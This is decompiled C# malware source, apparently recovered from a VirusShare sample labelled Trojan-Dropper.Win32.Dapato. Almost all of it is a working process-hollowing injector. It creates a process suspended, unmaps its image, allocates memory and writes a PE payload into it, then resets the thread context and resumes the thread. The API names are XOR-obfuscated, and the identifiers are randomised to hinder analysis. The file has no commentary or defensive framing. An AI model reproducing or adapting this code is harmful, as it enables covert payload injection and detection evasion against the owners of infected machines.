﻿// Decompiled with JetBrains decompiler
// Type: YhGBdfMSltjPKLJOyGNdFEUKMEdGkiRFaQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQ.aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk
// Assembly: rCWkXKkHG, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4D884AA0-6931-492A-BF88-91705CD23369
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00004-msil\Trojan-Dropper.Win32.Dapato.atdt-6d6f9fa7620cf0056d02556ff97c31ce6e6915683c9f12177fc6b506a2dc19c9.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace YhGBdfMSltjPKLJOyGNdFEUKMEdGkiRFaQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQ
{
  public class aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk
  {
    public static string RqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLkkMUgJcIgxXxJDVFbLWcYjBPXYhGBdfMSltjPKLJOyGNdFEUKMEdGkiRFaQHVfOOBBckxZsYwOaOMGYVr(
      string DataIn,
      string CodeKey)
    {
      long num1 = checked ((long) Math.Round(unchecked ((double) Strings.Len(DataIn) / 2.0)));
      long num2 = 1;
      string str;
      while (num2 <= num1)
      {
        int num3 = checked ((int) Math.Round(Conversion.Val("&H" + Strings.Mid(DataIn, (int) (2L * num2 - 1L), 2))));
        int num4 = Strings.Asc(Strings.Mid(CodeKey, checked ((int) (unchecked (num2 % (long) Strings.Len(CodeKey)) + 1L)), 1));
        str += Conversions.ToString(Strings.Chr(num3 ^ num4));
        checked { ++num2; }
      }
      return str;
    }

    public static bool bmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLkkMUgJcIgxXxJDVFbLWcYjBPX(
      byte[] pByteArray,
      string pProcess0Injectto)
    {
      bool flag;
      try
      {
        int int32 = BitConverter.ToInt32(pByteArray, 60);
        aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.resmthrd resmthrd = aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.vYcqnWjJJksFhBgEWvWhbtdzjuzwIZnvwGeZCEkqKSInijhmXelCdcsikcCeJHpdxoftEmlZZBJVxRwVmymkewtQzLRNYpqMNXubFUBHaiYEyzxDnhoSteuyCsSuZKGtPFvKUDDpcDZmBhzlpPDBuNKgDbhdQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuh.UvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLkkMUgJcIgxXxJDVFbLWcYjBPXYhGBdfMSltjPKLJOyGNdFEUKMEdGkiRFaQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbN<aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.resmthrd>("kernel32", "ResumeThread");
        IntPtr[] pInfo = new IntPtr[4];
        byte[] sInfo = new byte[68];
        aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.CreateProcess createProcess = aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.vYcqnWjJJksFhBgEWvWhbtdzjuzwIZnvwGeZCEkqKSInijhmXelCdcsikcCeJHpdxoftEmlZZBJVxRwVmymkewtQzLRNYpqMNXubFUBHaiYEyzxDnhoSteuyCsSuZKGtPFvKUDDpcDZmBhzlpPDBuNKgDbhdQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuh.UvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLkkMUgJcIgxXxJDVFbLWcYjBPXYhGBdfMSltjPKLJOyGNdFEUKMEdGkiRFaQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbN<aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.CreateProcess>("kernel32", aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.RqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLkkMUgJcIgxXxJDVFbLWcYjBPXYhGBdfMSltjPKLJOyGNdFEUKMEdGkiRFaQHVfOOBBckxZsYwOaOMGYVr("110B33073B09081A3D1A33153C2D", "hRyVfOlX"));
        int int16 = (int) BitConverter.ToInt16(pByteArray, checked (int32 + 6));
        IntPtr nSize = new IntPtr(BitConverter.ToInt32(pByteArray, checked (int32 + 84)));
        aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.getthrcontx getthrcontx = aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.vYcqnWjJJksFhBgEWvWhbtdzjuzwIZnvwGeZCEkqKSInijhmXelCdcsikcCeJHpdxoftEmlZZBJVxRwVmymkewtQzLRNYpqMNXubFUBHaiYEyzxDnhoSteuyCsSuZKGtPFvKUDDpcDZmBhzlpPDBuNKgDbhdQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuh.UvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLkkMUgJcIgxXxJDVFbLWcYjBPXYhGBdfMSltjPKLJOyGNdFEUKMEdGkiRFaQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbN<aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.getthrcontx>("kernel32", aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.RqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLkkMUgJcIgxXxJDVFbLWcYjBPXYhGBdfMSltjPKLJOyGNdFEUKMEdGkiRFaQHVfOOBBckxZsYwOaOMGYVr("031623333A1F23152834201830162F13", "vDsWgRmFtLwO"));
        IntPtr zero1 = IntPtr.Zero;
        if (createProcess((string) null, new StringBuilder(pProcess0Injectto), zero1, zero1, false, 4, zero1, (string) null, sInfo, pInfo))
        {
          uint[] ctxt = new uint[179];
          ctxt[0] = 65538U;
          if (getthrcontx(pInfo[1], ctxt))
          {
            IntPtr baseAddr = new IntPtr(checked ((long) ctxt[41] + 8L));
            IntPtr zero2 = IntPtr.Zero;
            IntPtr bufrSize = new IntPtr(4);
            IntPtr zero3 = IntPtr.Zero;
            aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.nunmpsctn nunmpsctn = aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.vYcqnWjJJksFhBgEWvWhbtdzjuzwIZnvwGeZCEkqKSInijhmXelCdcsikcCeJHpdxoftEmlZZBJVxRwVmymkewtQzLRNYpqMNXubFUBHaiYEyzxDnhoSteuyCsSuZKGtPFvKUDDpcDZmBhzlpPDBuNKgDbhdQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuh.UvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLkkMUgJcIgxXxJDVFbLWcYjBPXYhGBdfMSltjPKLJOyGNdFEUKMEdGkiRFaQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbN<aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.nunmpsctn>("ntdll", "NtUnmapViewOfSection");
            if (aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.vYcqnWjJJksFhBgEWvWhbtdzjuzwIZnvwGeZCEkqKSInijhmXelCdcsikcCeJHpdxoftEmlZZBJVxRwVmymkewtQzLRNYpqMNXubFUBHaiYEyzxDnhoSteuyCsSuZKGtPFvKUDDpcDZmBhzlpPDBuNKgDbhdQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuh.UvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLkkMUgJcIgxXxJDVFbLWcYjBPXYhGBdfMSltjPKLJOyGNdFEUKMEdGkiRFaQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbN<aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.rdprocssmr>("kernel32", aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.RqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLkkMUgJcIgxXxJDVFbLWcYjBPXYhGBdfMSltjPKLJOyGNdFEUKMEdGkiRFaQHVfOOBBckxZsYwOaOMGYVr("001132090007230B3005262037193C1F29", "mRtSmPuLhUvU"))(pInfo[0], baseAddr, ref zero2, (int) bufrSize, ref zero3) && nunmpsctn(pInfo[0], zero2) == 0U)
            {
              IntPtr num1 = new IntPtr(BitConverter.ToInt32(pByteArray, checked (int32 + 52)));
              IntPtr num2 = new IntPtr(BitConverter.ToInt32(pByteArray, checked (int32 + 80)));
              IntPtr lpBaseAddress = aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.vYcqnWjJJksFhBgEWvWhbtdzjuzwIZnvwGeZCEkqKSInijhmXelCdcsikcCeJHpdxoftEmlZZBJVxRwVmymkewtQzLRNYpqMNXubFUBHaiYEyzxDnhoSteuyCsSuZKGtPFvKUDDpcDZmBhzlpPDBuNKgDbhdQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuh.UvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLkkMUgJcIgxXxJDVFbLWcYjBPXYhGBdfMSltjPKLJOyGNdFEUKMEdGkiRFaQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbN<aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.vrtall>("kernel32", "VirtualAllocEx")(pInfo[0], num1, num2, 12288, 64);
              aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.wrtproc wrtproc = aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.vYcqnWjJJksFhBgEWvWhbtdzjuzwIZnvwGeZCEkqKSInijhmXelCdcsikcCeJHpdxoftEmlZZBJVxRwVmymkewtQzLRNYpqMNXubFUBHaiYEyzxDnhoSteuyCsSuZKGtPFvKUDDpcDZmBhzlpPDBuNKgDbhdQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuh.UvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLkkMUgJcIgxXxJDVFbLWcYjBPXYhGBdfMSltjPKLJOyGNdFEUKMEdGkiRFaQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbN<aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.wrtproc>("kernel32", aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.RqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLkkMUgJcIgxXxJDVFbLWcYjBPXYhGBdfMSltjPKLJOyGNdFEUKMEdGkiRFaQHVfOOBBckxZsYwOaOMGYVr("1219211E373C3C192A143618050F3F033C0F", "qEkHjRlNvI"));
              int lpNumberOfBytesWritten;
              int num3 = wrtproc(pInfo[0], lpBaseAddress, pByteArray, checked ((uint) (int) nSize), lpNumberOfBytesWritten) ? 1 : 0;
              int num4 = checked (int16 - 1);
              int num5 = 0;
              while (num5 <= num4)
              {
                int[] dst = new int[10];
                Buffer.BlockCopy((Array) pByteArray, checked (int32 + 248 + num5 * 40), (Array) dst, 0, 40);
                byte[] numArray = new byte[checked (dst[4] - 1 + 1)];
                Buffer.BlockCopy((Array) pByteArray, dst[5], (Array) numArray, 0, numArray.Length);
                num2 = new IntPtr(checked (lpBaseAddress.ToInt32() + dst[3]));
                num1 = new IntPtr(numArray.Length);
                int num6 = wrtproc(pInfo[0], num2, numArray, checked ((uint) (int) num1), lpNumberOfBytesWritten) ? 1 : 0;
                checked { ++num5; }
              }
              num2 = new IntPtr(checked ((long) ctxt[41] + 8L));
              num1 = new IntPtr(4);
              int num7 = wrtproc(pInfo[0], num2, BitConverter.GetBytes(lpBaseAddress.ToInt32()), checked ((uint) (int) num1), lpNumberOfBytesWritten) ? 1 : 0;
              ctxt[44] = checked ((uint) (lpBaseAddress.ToInt32() + BitConverter.ToInt32(pByteArray, int32 + 40)));
              int num8 = aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.vYcqnWjJJksFhBgEWvWhbtdzjuzwIZnvwGeZCEkqKSInijhmXelCdcsikcCeJHpdxoftEmlZZBJVxRwVmymkewtQzLRNYpqMNXubFUBHaiYEyzxDnhoSteuyCsSuZKGtPFvKUDDpcDZmBhzlpPDBuNKgDbhdQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuh.UvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLkkMUgJcIgxXxJDVFbLWcYjBPXYhGBdfMSltjPKLJOyGNdFEUKMEdGkiRFaQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbN<aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.strthd>("kernel32", "SetThreadContext")(pInfo[1], ctxt) ? 1 : 0;
            }
          }
          int num = (int) resmthrd(pInfo[1]);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
        goto label_10;
      }
      return true;
label_10:
      return flag;
    }

    public class vYcqnWjJJksFhBgEWvWhbtdzjuzwIZnvwGeZCEkqKSInijhmXelCdcsikcCeJHpdxoftEmlZZBJVxRwVmymkewtQzLRNYpqMNXubFUBHaiYEyzxDnhoSteuyCsSuZKGtPFvKUDDpcDZmBhzlpPDBuNKgDbhdQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuh
    {
      [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
      public static extern IntPtr LoadLibraryExA(
        [MarshalAs(UnmanagedType.VBByRefStr)] ref string uno,
        IntPtr due,
        aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.vYcqnWjJJksFhBgEWvWhbtdzjuzwIZnvwGeZCEkqKSInijhmXelCdcsikcCeJHpdxoftEmlZZBJVxRwVmymkewtQzLRNYpqMNXubFUBHaiYEyzxDnhoSteuyCsSuZKGtPFvKUDDpcDZmBhzlpPDBuNKgDbhdQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuh.xDDDDDDDD cinque);

      [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
      public static extern IntPtr GetProcAddress(IntPtr tre, [MarshalAs(UnmanagedType.VBByRefStr)] ref string quattro);

      public static obj UvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLkkMUgJcIgxXxJDVFbLWcYjBPXYhGBdfMSltjPKLJOyGNdFEUKMEdGkiRFaQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbN<obj>(
        string plib,
        string pfunc)
      {
        return (obj) Marshal.GetDelegateForFunctionPointer(aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.vYcqnWjJJksFhBgEWvWhbtdzjuzwIZnvwGeZCEkqKSInijhmXelCdcsikcCeJHpdxoftEmlZZBJVxRwVmymkewtQzLRNYpqMNXubFUBHaiYEyzxDnhoSteuyCsSuZKGtPFvKUDDpcDZmBhzlpPDBuNKgDbhdQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuh.GetProcAddress(aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.vYcqnWjJJksFhBgEWvWhbtdzjuzwIZnvwGeZCEkqKSInijhmXelCdcsikcCeJHpdxoftEmlZZBJVxRwVmymkewtQzLRNYpqMNXubFUBHaiYEyzxDnhoSteuyCsSuZKGtPFvKUDDpcDZmBhzlpPDBuNKgDbhdQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuh.LoadLibraryExA(ref plib, (IntPtr) 0, aQHVfOOBBckxZsYwOaOMGYVrbmsozRSnoyWDgvcjCKzfabZeQJQtVGWadUtWClhWqgXlveeREeBOcKbNRqfcWolIeDJFQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuhUvRQsardhHhsmFCZuTLITkyUIRpjNPvQVdTyIIHLipwbnnEHKCapiSzDXzESPxLk.vYcqnWjJJksFhBgEWvWhbtdzjuzwIZnvwGeZCEkqKSInijhmXelCdcsikcCeJHpdxoftEmlZZBJVxRwVmymkewtQzLRNYpqMNXubFUBHaiYEyzxDnhoSteuyCsSuZKGtPFvKUDDpcDZmBhzlpPDBuNKgDbhdQUiEGPYTwNfzTNDirrpugZgLXXmqtlKZSCjmHjnCMhuh.xDDDDDDDD.LOAD_LIBRARY_AS_DATAFILE), ref pfunc), typeof (obj));
      }

      public enum xDDDDDDDD : uint
      {
        DONT_RESOLVE_DLL_REFERENCES = 1,
        LOAD_LIBRARY_AS_DATAFILE = 2,
        LOAD_WITH_ALTERED_SEARCH_PATH = 8,
        LOAD_IGNORE_CODE_AUTHZ_LEVEL = 16, // 0x00000010
        LOAD_LIBRARY_AS_IMAGE_RESOURCE = 32, // 0x00000020
        LOAD_LIBRARY_AS_DATAFILE_EXCLUSIVE = 64, // 0x00000040
      }
    }

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool CreateProcess(
      string appName,
      StringBuilder commandLine,
      IntPtr procAttr,
      IntPtr thrAttr,
      [MarshalAs(UnmanagedType.Bool)] bool inherit,
      int creation,
      IntPtr env,
      string curDir,
      byte[] sInfo,
      IntPtr[] pInfo);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool getthrcontx(IntPtr hThr, uint[] ctxt);

    public delegate uint nunmpsctn(IntPtr hProc, IntPtr baseAddr);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool rdprocssmr(
      IntPtr hProc,
      IntPtr baseAddr,
      ref IntPtr bufr,
      int bufrSize,
      ref IntPtr numRead);

    public delegate uint resmthrd(IntPtr hThread);

    [return: MarshalAs(UnmanagedType.Bool)]
    public delegate bool strthd(IntPtr hThr, uint[] ctxt);

    public delegate IntPtr vrtall(
      IntPtr hProc,
      IntPtr addr,
      IntPtr size,
      int allocType,
      int prot);

    public delegate bool wrtproc(
      IntPtr hProcess,
      IntPtr lpBaseAddress,
      byte[] lpBuffer,
      uint nSize,
      int lpNumberOfBytesWritten);
  }
}